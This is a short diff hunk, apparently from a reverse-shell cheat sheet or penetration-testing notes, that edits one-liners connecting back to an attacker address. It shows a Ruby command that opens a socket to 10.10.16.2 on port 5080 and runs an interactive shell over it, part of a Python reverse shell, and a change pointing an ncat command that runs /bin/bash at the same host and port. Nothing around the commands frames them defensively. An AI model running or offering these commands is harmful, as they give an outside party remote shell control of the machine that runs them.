@@ -214,4 +214,4 @@ python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty")
 
 ruby -rsocket -e'f=TCPSocket.open("10.10.16.2",5080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
-ncat 10.0.0.1 4242 -e /bin/bash
+ncat 10.10.16.2 5080 -e /bin/bash
